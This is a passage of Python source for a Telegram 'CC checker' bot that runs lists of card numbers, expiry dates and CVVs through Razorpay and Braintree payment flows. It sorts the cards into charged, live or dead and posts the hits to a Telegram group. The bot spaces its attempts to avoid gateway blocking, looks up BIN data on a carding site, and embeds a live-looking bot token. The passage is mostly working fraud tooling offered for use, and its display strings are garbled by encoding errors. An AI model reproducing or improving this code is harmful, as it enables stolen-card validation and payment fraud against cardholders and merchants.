                cm4 = types.InlineKeyboardButton(f"â¢ DEAD â : [ {dd} ] â¢", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"â¢ TOTAL ð» : [ {total} ] â¢", callback_data='x')
                cm6 = types.InlineKeyboardButton(" STOP ð ", callback_data='stop')
                mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''Processing with {gateway_type.title()} Gateway...
ððð â @imposteronline''', reply_markup=mes)

                try:
                    # Process based on selected gateway
                    if gateway_type == "razorpay":
                        settings = user_settings['razorpay']
                        cc_parts = cc.strip().split('|')
                        if len(cc_parts) == 4:
                            card_number, exp_month, exp_year, cvv = cc_parts
                            amount_paise = settings['amount'] * 100

                            # Get merchant data
                            keyless_header, key_id, payment_link_id, payment_page_item_id, error_msg = extract_merchant_data_with_playwright(settings['site_url'])
                            if error_msg:
                                last = f"Setup failed: {error_msg}"
                            else:
                                # Get session token
                                session_token, error_msg = get_dynamic_session_token()
                                if error_msg:
                                    last = f"Token error: {error_msg}"
                                else:
                                    # Create order and submit payment
                                    session = requests.Session()
                                    order_id = create_order(session, payment_link_id, amount_paise, payment_page_item_id)
                                    if not order_id:
                                        last = "Failed to create order"
                                    else:
                                        response = submit_payment(session, order_id, (card_number, exp_month, exp_year, cvv), 
                                                                random_user_info(), amount_paise, key_id, keyless_header, 
                                                                payment_link_id, session_token, settings['site_url'])

                                        try:
                                            data = response.json()
                                            if data.get("redirect"):
                                                redirect_result = handle_redirect_and_get_result(data['request']['url'])
                                                if "success" in redirect_result.lower() or "approved" in redirect_result.lower():
                                                    last = "requires_action"
                                                else:
                                                    last = f"Your card was declined: {redirect_result}"
                                            elif "error" in data:
                                                last = f"Your card was declined: {data['error'].get('description', 'Unknown error')}"
                                            else:
                                                last = "Your card was declined"
                                        except:
                                            last = "Your card was declined"
                        else:
                            last = "Invalid card format"

                    elif gateway_type == "braintree":
                        settings = user_settings['braintree']
                        cc_parts = cc.strip().split('|')
                        if len(cc_parts) == 4:
                            session = cloudscraper.create_scraper()
                            result = perform_braintree_check(session, settings, {
                                'cc': cc_parts[0],
                                'mm': cc_parts[1],
                                'yy': cc_parts[2],
                                'cvv': cc_parts[3]
                            })

                            if result["is_approved"]:
                                last = "succeeded"
                            else:
                                last = result["message"]
                        else:
                            last = "Invalid card format"
                    else:
                        # Default gateway
                        last = str(Tele(cc))

                except Exception as e:
                    print(e)
                    last = "Your card was declined."

                msg = f'''ðð©ð©ð«ð¨ð¯ðð â

ððð«ð: {cc}ððð­ðð°ðð²: {gateway_type.title()}
ððð¬ð©ð¨ð§ð¬ð: VBV/CVV.

ðð§ðð¨: {brand} - {typ} - {dicr}
ðð¬ð¬ð®ðð«: {bank}
ðð¨ð®ð§ð­ð«ð²: {cn} {emj}

ðð¢ð¦ð: 0 ð¬ððð¨ð§ðð¬
ððð­ ðð¨ ðð¡ððð¤: {total - dd - live - ch}
ðð¡ððð¤ðð ðð²: @{username}
ðð¨ð­ ðð²:  @PROGAMER666YT'''
                print(last)
                if "requires_action" in last:
                    send_telegram_notification(msg)
                    bot.reply_to(message, msg)
                    live += 1
                elif "Your card does not support this type of purchase." in last:
                    live += 1
                    send_telegram_notification(msg)
                    bot.reply_to(message, msg)
                elif "Your card's security code is incorrect." in last:
                    live += 1
                    send_telegram_notification(msg)
                    bot.reply_to(message, msg)
                elif "succeeded" in last:
                    ch += 1
                    elapsed_time = time.time() - start_time
                    msg1 = f'''ðð©ð©ð«ð¨ð¯ðð â

ððð«ð: {cc}ððð­ðð°ðð²: {gateway_type.title()}
ððð¬ð©ð¨ð§ð¬ð: Card Checked Successfully

ðð§ðð¨: {brand} - {typ} - {dicr}
ðð¬ð¬ð®ðð«: {bank}
ðð¨ð®ð§ð­ð«ð²: {cn} {emj}

ðð¢ð¦ð: {elapsed_time:.2f} ð¬ððð¨ð§ðð¬
ððð­ ðð¨ ðð¡ððð¤: {total - dd - live - ch}
ðð¡ððð¤ðð ðð²: @{username}
ðð¨ð­ ðð²: @PROGAMER666YT'''
                    send_telegram_notification(msg1)
                    bot.reply_to(message, msg1)
                else:
                    dd += 1

                checked_count = ch + live + dd
                if checked_count % 50 == 0:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="Taking a 1-minute break... To Prevent Gate from Dying, Please wait â³")
                    time.sleep(60)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Resuming the Process, Sorry for the Inconvience")

    except Exception as e:
        print(e)

    # Clear gateway settings after processing
    if user_id in user_gateway_settings:
        if 'razorpay' in user_gateway_settings[user_id]:
            del user_gateway_settings[user_id]['razorpay']
        if 'braintree' in user_gateway_settings[user_id]:
            del user_gateway_settings[user_id]['braintree']

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''ððððð ððððððððð â

Charged CC : {ch}
CCN : {live}
Dead CC : {dd}
Total : {total}
Gateway : {gateway_type.title()}

ððð ðð â @PROGAMER666YT''')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass
    bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
    bot.send_message(call.message.chat.id, "The bot has been stopped. No further tasks will be processed.")

@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            if not allowed_ids:
                bot.reply_to(message, "No authorized users found.")
                return

            # Prepare the message with user IDs and usernames
            user_list = "Authorized Users:\n\n"
            for user_id in allowed_ids:
                user_id = user_id.strip()  # Clean any extra spaces/newlines
                try:
                    user = bot.get_chat(user_id)
                    username = user.username or "No Username"
                    user_list += f"â¢ {username} (ID: {user_id})\n"
                except Exception as e:
                    user_list += f"â¢ User ID: {user_id} (Username not found)\n"

            # Send the list to the owner
            bot.reply_to(message, user_list)
        except FileNotFoundError:
            bot.reply_to(message, "id.txt file not found. No authorized users.")
    else:
        bot.reply_to(message, "You are not authorized to view the list of authorized users.")

print("DONE â")

allowed_group = -1002839621564
last_used = {}

@bot.message_handler(commands=["chk"])
def chk(message):
    try:
        # Note: ALLOWED_GROUP_ID should be allowed_group
        if message.chat.id != allowed_group:
            bot.reply_to(message, "This command can only be used in the designated group. User Must Join the Group @mistoshicheckerchat")
            return

        user_id = message.from_user.id  # Get user ID
        current_time = time.time()  # Get the current timestamp

        # Check if the user is in cooldown
        if user_id in last_used and current_time - last_used[user_id] < 25:
            remaining_time = 25 - int(current_time - last_used[user_id])
            bot.reply_to(message, f"Please wait {remaining_time} seconds before using this command again.")
            return

        # Update the last usage timestamp
        last_used[user_id] = current_time

        # Extract the card number from the command
        if len(message.text.split()) < 2:
            bot.reply_to(message, "Please provide a valid card number. Usage: /chk <card_number>")
            return

        cc = message.text.split('/chk ')[1]
        username = message.from_user.username or "N/A"

        try:
            initial_message = bot.reply_to(message, "Your card is being checked, please wait...")
        except telebot.apihelper.ApiTelegramException:
            initial_message = bot.send_message(message.chat.id, "Your card is being checked, please wait...")

        # Get the response from the `Tele` function
        try:
            last = str(Tele(cc))  # Fixed: was using undefined 'ccx'
        except Exception as e:
            print(f"Error in Tele function: {e}")
            last = "An error occurred."

        # Fetch BIN details
        try:
            response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
            if response.status_code == 200:
                data = response.json()  # Parse JSON
            else:
                print(f"Error: Received status code {response.status_code}")
                data = {}
        except Exception as e:
            print(f"Error fetching BIN data: {e}")
            data = {}

        # Extract details with fallback values
        bank = data.get('bank', 'N/A')
        brand = data.get('brand', 'N/A')
        emj = data.get('country_flag', 'N/A')
        cn = data.get('country_name', 'N/A')
        dicr = data.get('level', 'N/A')
        typ = data.get('type', 'N/A')
        url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'

        if "requires_action" in last:
            message_ra = f'''ðð©ð©ð«ð¨ð¯ðð â

ððð«ð: {cc} ððð­ðð°ðð²: 1$ Charged
ððð¬ð©ð¨ð§ð¬ð: VBV.

ðð§ðð¨: {brand} - {typ} - {dicr}
ðð¬ð¬ð®ðð«: {bank}
ðð¨ð®ð§ð­ð«ð²: {cn} {emj}

ðð¢ð¦ð: 0 ð¬ððð¨ð§ðð¬
ðð¡ððð¤ðð ðð²: @{username}
ðð¨ð­ ðð²: @PROGAMER666YT'''
            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id)
        elif "succeeded" in last:
            msg_sec = f'''ðð©ð©ð«ð¨ð¯ðð â

ððð«ð: {cc}
ððð­ðð°ðð²: 1$ Charged
ððð¬ð©ð¨ð§ð¬ð: Card Checked Successfully.

ðð§ðð¨: {brand} - {typ} - {dicr}
ðð¬ð¬ð®ðð«: {bank}
ðð¨ð®ð§ð­ð«ð²: {cn} {emj}

ðð¢ð¦ð: 0 ð¬ððð¨ð§ðð¬
ðð¡ððð¤ðð ðð²: @{username}
ðð¨ð­ ðð²: @PROGAMER666YT'''
            bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id)
        else:
            msg_dec = f'''ðððð¥ð¢ð§ðð â

ððð«ð: {cc}
ððð­ðð°ðð²: 1$ Charged
ððð¬ð©ð¨ð§ð¬ð: Card Declined.

ðð§ðð¨: {brand} - {typ} - {dicr}
ðð¬ð¬ð®ðð«: {bank}
ðð¨ð®ð§ð­ð«ð²: {cn} {emj}

ðð¢ð¦ð: 0 ð¬ððð¨ð§ðð¬
ðð¡ððð¤ðð ðð²: @{username}
ðð¨ð­ ðð²: @PROGAMER666YT'''
            bot.edit_message_text(msg_dec, chat_id=message.chat.id, message_id=initial_message.message_id)

    except Exception as e:
        print(f"Unexpected error: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please try again later.")


def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot8165919062:AAHzFPAocyoM6_DBsH7WRwWD5or0JhMomIU/sendMessage"
    data = {'chat_id': -1002839621564, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)

bot.infinity_polling()
